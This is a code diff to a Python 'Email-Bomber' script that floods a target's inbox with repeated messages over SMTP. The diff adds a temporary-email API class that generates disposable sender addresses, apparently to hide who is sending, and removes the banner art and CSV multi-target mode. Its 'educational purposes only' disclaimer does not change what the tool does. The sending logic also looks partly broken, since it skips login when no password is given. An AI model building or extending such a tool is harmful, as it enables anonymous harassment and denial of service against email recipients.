@@ -8,8 +8,7 @@ from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
 import csv
-
-
+import requests
 
 
 class bcolors:
@@ -19,32 +18,9 @@ class bcolors:
 
 
 def banner():
-    print(bcolors.GREEN + '+[+[+[ Email-Bomber v2.0 ]+]+]+')
+    print(bcolors.GREEN + '+[+[+[ Email-Bomber v2.1 with Temp Mail API ]+]+]+')
     print(bcolors.GREEN + '+[+[+[ Ethical Use Only ]+]+]+')
     print(bcolors.GREEN + '"This script is for educational purposes only."')
-    print(bcolors.GREEN + '''
-                     \|/
-                       --+--'
-                          |
-                      ,--'#--.
-                      |#######|
-                   _.-'#######-._
-                ,-'###############-.
-              ,'#####################,         .___     .__         .
-             |#########################|        [__ ._ _ [__) _ ._ _ |_  _ ._.
-            |###########################|       [___[ | )[__)(_)[ | )[_)(/,[
-           |#############################|
-           |#############################|              Author: ROTATOR12
-           |#############################|
-            |###########################|
-             \#########################/
-              .#####################,'
-                ._###############_,'
-                   --..#####..--'                                 ,-.--.
-*.______________________________________________________________,' (Bomb)
-                                                                    --' ''')
-
-
 
 
 def disclaimer():
@@ -53,6 +29,49 @@ def disclaimer():
     if consent.lower() != 'yes':
         print("Exiting program.")
         sys.exit(0)
+
+
+class TempMailAPI:
+    def __init__(self):
+        self.base_url = "https://api.temp-mail.org/request/"
+        self.api_key = None
+        self.temp_email = None
+
+    def set_api_key(self):
+        self.api_key = input("Enter your Temp Mail API Key: ").strip()
+        print("Checking API key validity...")
+        if self.check_api_key():
+            print(bcolors.GREEN + "API Key is working!")
+        else:
+            print(bcolors.RED + "Invalid API Key. Please try again.")
+            sys.exit(1)
+
+    def check_api_key(self):
+        url = f"{self.base_url}domains/"
+        headers = {"Authorization": f"Bearer {self.api_key}"}
+        try:
+            response = requests.get(url, headers=headers)
+            if response.status_code == 200:
+                return True
+            else:
+                print(f"Error: {response.status_code} - {response.text}")
+                return False
+        except requests.RequestException as e:
+            print(f"Error: {e}")
+            return False
+
+    def get_temp_email(self):
+        url = f"{self.base_url}mail/id/"
+        headers = {"Authorization": f"Bearer {self.api_key}"}
+        try:
+            response = requests.get(url, headers=headers)
+            if response.status_code == 200:
+                self.temp_email = response.json()["email"]
+                print(bcolors.GREEN + f"Temporary email generated: {self.temp_email}")
+            else:
+                print(f"Error: {response.status_code} - {response.text}")
+        except requests.RequestException as e:
+            print(f"Error: {e}")
 
 
 class EmailBomber:
@@ -82,20 +101,23 @@ class EmailBomber:
         except Exception as e:
             print(f'ERROR: {e}')
 
-    def setup_email(self):
+    def setup_email(self, temp_mail_api=None):
         try:
             print(bcolors.RED + '\n+[+[+[ Setting up email ]+]+]+')
-            self.server = input(bcolors.GREEN + 'Enter email server | 1:Gmail 2:Yahoo 3:Outlook <: ')
-            premade = {'1': 'smtp.gmail.com', '2': 'smtp.mail.yahoo.com', '3': 'smtp-mail.outlook.com'}
-            self.server = premade.get(self.server, self.server)
+            self.fromAddr = None
+            self.fromPwd = None
 
-            if self.server not in premade.values():
-                self.port = int(input(bcolors.GREEN + 'Enter port number <: '))
+            use_temp = input(bcolors.YELLOW + "Do you want to use a temporary email via API? (yes/no): ").lower()
+            if use_temp == "yes" and temp_mail_api:
+                temp_mail_api.get_temp_email()
+                self.fromAddr = temp_mail_api.temp_email
+                self.fromPwd = None  # No password needed for temp mail
             else:
-                self.port = 587
+                use_personal = input(bcolors.YELLOW + "Do you want to use your personal email address? (yes/no): ").lower()
+                if use_personal == "yes":
+                    self.fromAddr = input(bcolors.GREEN + 'Enter your email address <: ')
+                    self.fromPwd = getpass.getpass(bcolors.GREEN + 'Enter your email password <: ')
 
-            self.fromAddr = input(bcolors.GREEN + 'Enter your email address <: ')
-            self.fromPwd = getpass.getpass(bcolors.GREEN + 'Enter your email password <: ')
             self.subject = input(bcolors.GREEN + 'Enter subject <: ')
             self.message = input(bcolors.GREEN + 'Enter message <: ')
 
@@ -121,11 +143,11 @@ class EmailBomber:
                 part.add_header('Content-Disposition', f"attachment; filename={self.attachment}")
                 self.msg.attach(part)
 
-            self.s = smtplib.SMTP(self.server, self.port)
+            self.s = smtplib.SMTP("smtp.gmail.com", 587)  # Default Gmail SMTP server
             self.s.ehlo()
             self.s.starttls()
-            self.s.ehlo()
-            self.s.login(self.fromAddr, self.fromPwd)
+            if self.fromPwd:  # Login only if a password is provided
+                self.s.login(self.fromAddr, self.fromPwd)
         except Exception as e:
             print(f'ERROR: {e}')
 
@@ -151,22 +173,17 @@ if __name__ == '__main__':
     banner()
     disclaimer()
 
+    # Ask if the user wants to use the API or personal email first
+    choice = input(bcolors.YELLOW + "Do you want to use the Temp Mail API for temporary email? (yes/no): ").lower()
+    
+    if choice == "yes":
+        # Initialize Temp Mail API
+        temp_mail = TempMailAPI()
+        temp_mail.set_api_key()
+    else:
+        temp_mail = None  # No API, use personal email
+
     bomber = EmailBomber()
     bomber.setup_bomb()
-    bomber.setup_email()
-
-    # Optional Multi-target support
-    multi_target = input(bcolors.YELLOW + 'Do you want to send emails to multiple targets from a CSV file? (yes/no): ')
-    if multi_target.lower() == 'yes':
-        csv_file = input(bcolors.GREEN + 'Enter the CSV file path: ')
-        try:
-            with open(csv_file, 'r') as file:
-                reader = csv.reader(file)
-                for row in reader:
-                    bomber.target = row[0]
-                    print(bcolors.YELLOW + f'Sending email to {bomber.target}')
-                    bomber.start_attack()
-        except Exception as e:
-            print(f'ERROR: {e}')
-    else:
-        bomber.start_attack()
+    bomber.setup_email(temp_mail)
+    bomber.start_attack()
